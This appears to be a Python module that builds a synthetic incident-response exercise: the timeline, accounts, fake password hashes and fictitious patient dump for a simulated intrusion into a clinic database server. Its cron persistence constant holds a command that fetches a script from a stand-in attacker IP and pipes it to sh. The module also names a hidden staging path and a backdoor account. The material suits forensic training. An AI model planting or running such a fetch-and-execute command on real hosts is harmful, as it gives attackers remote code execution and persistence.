"""
Constantes, activos y línea temporal del escenario 02.

Todo es sintético: dominios inventados, IPs de los rangos de documentación
(RFC 5737) y de 10.20.30.0/24, personas y datos ficticios.
"""
import random
from datetime import datetime, timedelta, timezone

random.seed(20260930)

HOSTNAME = "db01"
FQDN = "db01.kelbrook.internal"

# --- activos ---------------------------------------------------------------
DB, WEB, NAS, WS, DNS_SRV, GW = "10.20.30.20", "10.20.30.10", "10.20.30.40", "10.20.30.55", "10.20.30.2", "10.20.30.1"
NTP = "203.0.113.5"
ATTACKER = "198.51.100.212"      # VPS del atacante (distinto al del escenario 01)
SCANNER = "203.0.113.77"         # fuerza bruta de fondo de internet, no relacionada
ATTACKER_PORT_HTTP = 8080

MACS = {DB: "52:54:00:4b:77:1e", WEB: "52:54:00:a3:1f:9c", NAS: "00:11:32:9a:6c:d4",
        WS: "f8:75:a4:12:0b:7d", DNS_SRV: "52:54:00:7e:02:41", GW: "00:1c:73:5d:21:e0"}
TTLS = {DB: 64, WEB: 64, NAS: 64, WS: 128, DNS_SRV: 64, ATTACKER: 52, SCANNER: 47, NTP: 58}


def mac(ip): return MACS.get(ip, MACS[GW])      # lo externo llega con la MAC del cortafuegos
def ttl(ip): return TTLS.get(ip, 53)


# --- tiempo ----------------------------------------------------------------
D29 = datetime(2026, 9, 29, tzinfo=timezone.utc)
D30 = datetime(2026, 9, 30, tzinfo=timezone.utc)


def t29(h, m, s=0, us=0): return (D29 + timedelta(hours=h, minutes=m, seconds=s, microseconds=us)).timestamp()
def t30(h, m, s=0, us=0): return (D30 + timedelta(hours=h, minutes=m, seconds=s, microseconds=us)).timestamp()
def dt(ts): return datetime.fromtimestamp(ts, timezone.utc)
def syslog_time(ts): return dt(ts).strftime("%b %e %H:%M:%S")


CAPTURE_START, CAPTURE_END = t29(22, 0, 0), t30(3, 2, 0)
TRIAGE_TIME = t30(8, 30, 0)

# --- cuentas ---------------------------------------------------------------
# (nombre, uid, gid, gecos, home, shell)
LOCAL_USERS = [
    ("mvega", 1001, 1001, "Marta Vega,DBA", "/home/mvega", "/bin/bash"),
    ("portal_app", 1002, 1002, "Despliegue portal", "/home/portal_app", "/bin/bash"),
    ("kbbackup", 1003, 1003, "Copias MariaDB", "/var/backups/mariadb", "/usr/sbin/nologin"),
]
NEW_USER = ("support", 1004, 1004, "", "/home/support", "/bin/bash")

# Hashes SHA-512 crypt precalculados (contraseñas ficticias):
#   mvega       Vg#mariadb-2026
#   portal_app  Kb!portal#2024   (la misma que el usuario de MariaDB del escenario 01)
#   support     Welcome123       (la que puso el atacante)
HASHES = {
    "mvega": "$6$kbmvegSx9Q$e2sWOJyUD68Wd22RXWcRsFD9QXcZCCN0FyUOKIVMdtmUdXfHcjGginU5lq9xQRCtE/yjMKtPqjOl9s3WFvt8o0",
    "portal_app": "$6$kbportSx9Q$G.zi1yhL7yqV.8UkKnkA67df9HsAfeDHCHBm/gQCYVW7wf7O0sT/W2JqYfIA9/R0xzXFivPwo/Lh.FLdEc9tp/",
    "support": "$6$kbsuppSx9Q$pcV6dwvG7bH69ePj1gpQ35uwmA7wjmI9NEttHEWZlkOrluvANj815WeX1vJ/D0tk1z.2BV/yd4xQK.RVmPLEX1",
}

# Clave ed25519 que el atacante deja en /root/.ssh/authorized_keys.
# Es un blob con formato válido (clave de 32 bytes aleatorios), no corresponde a ninguna clave real.
KEY_COMMENT = "ops@kelbrook-backup"
KEY_SEED = b"kelbrook-sim-02-ed25519-pubkey!!"   # 32 bytes


def attacker_pubkey():
    import base64
    blob = b"\x00\x00\x00\x0bssh-ed25519" + b"\x00\x00\x00\x20" + KEY_SEED
    return "ssh-ed25519 " + base64.b64encode(blob).decode() + " " + KEY_COMMENT, blob


def attacker_key_fingerprint():
    import base64
    import hashlib
    _, blob = attacker_pubkey()
    return "SHA256:" + base64.b64encode(hashlib.sha256(blob).digest()).decode().rstrip("=")


MVEGA_KEY_FP = "SHA256:9Jm2vQp0Xw1kLr7cTfHsYbN3aE5uDgK8oZiP4lMnWqA"

# --- línea temporal de la intrusión (UTC) ----------------------------------
# Intentos previos del atacante: (hora, usuario, puerto origen, nº de contraseñas probadas en esa conexión, existe en db01)
ATTACKER_FAILS = [
    (t30(1, 2, 10), "root", 51702, 2, True),
    (t30(1, 2, 23), "nhollis", 51708, 1, False),
    (t30(1, 2, 32), "deploy", 51715, 1, False),
    (t30(1, 2, 41), "admin", 51721, 1, False),
]
T_LOGIN = t30(1, 3, 5)            # Accepted password for portal_app
PORT_LOGIN = 51734
T_SUDO_L = t30(1, 9, 42)
T_SUDO_VIM = t30(1, 10, 18)
T_ROOT_SHELL = t30(1, 10, 31)
T_USERADD = t30(1, 15, 2)
T_PASSWD = t30(1, 15, 19)
T_AUTHKEY = t30(1, 16, 20)
T_CRON_FILE = t30(1, 17, 40)
T_CRON_RELOAD = t30(1, 18, 1)
T_STAGING = t30(1, 20, 40)
T_EXFIL = t30(1, 24, 5)
T_RM_STAGING = t30(1, 25, 30)
T_ROOT_EXIT = t30(1, 26, 12)
T_SUDO_CLOSE = t30(1, 26, 14)
T_HIST_CLEAR = t30(1, 26, 40)
T_LOGOUT = t30(1, 27, 3)
T_KEY_LOGIN = t30(2, 5, 17)
PORT_KEY_LOGIN = 51902
T_KEY_LOGOUT = t30(2, 7, 2)

BEACON_FIRST = t30(1, 20, 1)
BEACON_TIMES = [BEACON_FIRST + 600 * i for i in range(11)]   # 01:20 ... 03:00
CRON_FILE = "/etc/cron.d/mariadb-health"
CRON_CMD = f"curl -s http://{ATTACKER}:{ATTACKER_PORT_HTTP}/c/$(hostname) | sh"
STAGING = "/var/tmp/.font-cache"
EXFIL_NAME = "kb_clinica.tgz"

# --- ruido legítimo --------------------------------------------------------
T_MVEGA_IN, T_MVEGA_OUT = t29(22, 3, 12), t29(22, 17, 48)
MVEGA_PORT = 52217
T_BACKUP_START, T_BACKUP_END = t29(23, 0, 1), t29(23, 4, 30)
BACKUP_BYTES = 9_437_184
SCAN_START, SCAN_END = t29(23, 41, 5), t30(0, 36, 20)
SCAN_USERS = ["root", "root", "root", "admin", "ubuntu", "pi", "test", "oracle", "postgres", "root", "admin", "user"]

# PIDs
PID_SSHD, PID_CRON, PID_LOGIND, PID_MARIADB, PID_RSYSLOG = 698, 705, 712, 1021, 640


class Pid:
    """PID diferido: se numera al final, en orden cronológico de primera aparición."""
    def __init__(self): self.n = None
    def __str__(self): return str(self.n)
    def __int__(self): return self.n


class PidPool:
    def __init__(self, start, step=(1, 5)):
        self.start, self.step, self.items = start, step, []

    def next(self, ts=None):
        p = Pid()
        self.items.append((ts, p))
        return p

    def number(self, first_seen):
        """first_seen: dict id(Pid) -> ts para los que no se registraron con hora."""
        n = self.start
        for ts, p in sorted(((ts if ts is not None else first_seen.get(id(p), 0)), p) for ts, p in self.items):
            n += random.randint(*self.step)
            p.n = n


# --- datos ficticios de pacientes ------------------------------------------
NOMBRES = ["Lucía", "Mateo", "Sofía", "Hugo", "Martina", "Leo", "Julia", "Daniel", "Paula", "Álvaro", "Valeria",
           "Adrián", "Carla", "Pablo", "Emma", "Nicolás", "Noa", "Marcos", "Alba", "Enzo", "Vega", "Bruno", "Clara",
           "Izan", "Olivia", "Thiago", "Lola", "Gael", "Candela", "Iker", "Carmen", "Luca", "Abril", "Samuel", "Elena"]
APELLIDOS = ["García", "Rodríguez", "Martínez", "López", "Sánchez", "Pérez", "Gómez", "Fernández", "Moreno", "Jiménez",
             "Ruiz", "Hernández", "Díaz", "Álvarez", "Romero", "Navarro", "Torres", "Domínguez", "Gil", "Vázquez",
             "Serrano", "Ramos", "Blanco", "Molina", "Suárez", "Ortega", "Castro", "Delgado", "Ortiz", "Marín", "Iglesias"]
MOTIVOS = ["Revisión anual", "Control tensión", "Analítica", "Dermatología", "Traumatología", "Pediatría",
           "Vacunación", "Fisioterapia", "Cardiología", "Oftalmología"]
PATIENT_COUNT = 1240


def dni(i):
    n = 31000000 + (i * 7919) % 60000000
    return f"{n:08d}{'TRWAGMYFPDXBNJZSQVHLCKE'[n % 23]}"


def patient_rows(n=PATIENT_COUNT):
    rows = []
    for i in range(1, n + 1):
        nom, ap1, ap2 = random.choice(NOMBRES), random.choice(APELLIDOS), random.choice(APELLIDOS)
        nhc = f"KB{100000 + i:06d}"
        tel = f"6{random.randint(10000000, 99999999)}"
        mail = f"{nom.lower().replace('á','a').replace('é','e').replace('í','i').replace('ó','o').replace('ú','u')}.{ap1.lower().replace('á','a').replace('é','e').replace('í','i').replace('ó','o').replace('ú','u')}{random.randint(1,99)}@example.net"
        nac = f"{random.randint(1940, 2020)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}"
        rows.append((i, nhc, nom, f"{ap1} {ap2}", dni(i), nac, tel, mail))
    return rows


def mysqldump_kb_clinica():
    """Volcado al estilo mysqldump de la base kb_clinica (pacientes, citas, historias)."""
    rows = patient_rows()
    out = ["-- MariaDB dump 10.19  Distrib 10.6.16-MariaDB, for debian-linux-gnu (x86_64)", "--",
           f"-- Host: localhost    Database: kb_clinica", "-- ------------------------------------------------------",
           "-- Server version\t10.6.16-MariaDB-0ubuntu0.22.04.1", "",
           "/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;",
           "/*!40101 SET NAMES utf8mb4 */;", "",
           "DROP TABLE IF EXISTS `pacientes`;",
           "CREATE TABLE `pacientes` (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `nhc` varchar(12) NOT NULL,\n"
           "  `nombre` varchar(64) NOT NULL,\n  `apellidos` varchar(128) NOT NULL,\n  `dni` varchar(16) NOT NULL,\n"
           "  `fecha_nac` date NOT NULL,\n  `telefono` varchar(16) DEFAULT NULL,\n  `email` varchar(128) DEFAULT NULL,\n"
           "  PRIMARY KEY (`id`),\n  UNIQUE KEY `nhc` (`nhc`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;", "",
           "LOCK TABLES `pacientes` WRITE;"]
    for k in range(0, len(rows), 100):
        chunk = rows[k:k + 100]
        vals = ",".join(f"({r[0]},'{r[1]}','{r[2]}','{r[3]}','{r[4]}','{r[5]}','{r[6]}','{r[7]}')" for r in chunk)
        out.append(f"INSERT INTO `pacientes` VALUES {vals};")
    out += ["UNLOCK TABLES;", "", "DROP TABLE IF EXISTS `citas`;",
            "CREATE TABLE `citas` (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `paciente_id` int(11) NOT NULL,\n"
            "  `fecha` datetime NOT NULL,\n  `motivo` varchar(64) NOT NULL,\n  `profesional` varchar(64) NOT NULL,\n"
            "  PRIMARY KEY (`id`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;", "", "LOCK TABLES `citas` WRITE;"]
    citas = []
    for i in range(1, 2201):
        pid = random.randint(1, PATIENT_COUNT)
        f = f"2026-{random.randint(1,10):02d}-{random.randint(1,28):02d} {random.randint(8,19):02d}:{random.choice(['00','15','30','45'])}:00"
        citas.append(f"({i},{pid},'{f}','{random.choice(MOTIVOS)}','Dr. {random.choice(APELLIDOS)}')")
    for k in range(0, len(citas), 150):
        out.append("INSERT INTO `citas` VALUES " + ",".join(citas[k:k + 150]) + ";")
    out += ["UNLOCK TABLES;", "", "DROP TABLE IF EXISTS `historias`;",
            "CREATE TABLE `historias` (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `paciente_id` int(11) NOT NULL,\n"
            "  `fecha` date NOT NULL,\n  `diagnostico` varchar(255) NOT NULL,\n  `notas` text DEFAULT NULL,\n"
            "  PRIMARY KEY (`id`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;", "", "LOCK TABLES `historias` WRITE;"]
    hist = []
    for i in range(1, 901):
        pid = random.randint(1, PATIENT_COUNT)
        hist.append(f"({i},{pid},'2026-{random.randint(1,9):02d}-{random.randint(1,28):02d}','{random.choice(MOTIVOS)} - sin hallazgos relevantes','Seguimiento en 6 meses')")
    for k in range(0, len(hist), 150):
        out.append("INSERT INTO `historias` VALUES " + ",".join(hist[k:k + 150]) + ";")
    out += ["UNLOCK TABLES;", "", "-- Dump completed on 2026-09-30  1:21:33", ""]
    return "\n".join(out).encode()


def exfil_archive():
    """kb_clinica.tgz tal y como lo empaquetó el atacante (tar + gzip del .sql)."""
    import gzip
    import io
    import tarfile
    sql = mysqldump_kb_clinica()
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        ti = tarfile.TarInfo("kb_clinica.sql")
        ti.size, ti.mtime, ti.mode, ti.uid, ti.gid, ti.uname, ti.gname = len(sql), int(T_STAGING + 53), 0o644, 0, 0, "root", "root"
        tf.addfile(ti, io.BytesIO(sql))
    gz = io.BytesIO()
    with gzip.GzipFile(fileobj=gz, mode="wb", mtime=int(T_STAGING + 150)) as g:
        g.write(buf.getvalue())
    return gz.getvalue()


def scanner_attempts():
    """Intentos del escáner de fondo: cadencia metronómica, un intento por conexión."""
    out, t, port = [], SCAN_START, 40216
    i = 0
    while t < SCAN_END:
        user = SCAN_USERS[i % len(SCAN_USERS)]
        out.append((t, user, port, user == "root"))
        t += random.uniform(16.0, 19.0)
        port += random.randint(2, 9)
        i += 1
    return out


# Segundo escáner, más tarde y más corto, para que haya ruido fuera de la ventana de captura
def late_scanner_attempts():
    out, t, port = [], t30(5, 12, 44), 58120
    for u in ["root", "admin", "root", "ubuntu", "root", "test"]:
        out.append((t, u, port, u == "root"))
        t += random.uniform(3.0, 5.0)
        port += random.randint(1, 3)
    return out


LATE_SCANNER = "192.0.2.201"

SCANNER_ATTEMPTS = scanner_attempts()
LATE_SCANNER_ATTEMPTS = late_scanner_attempts()
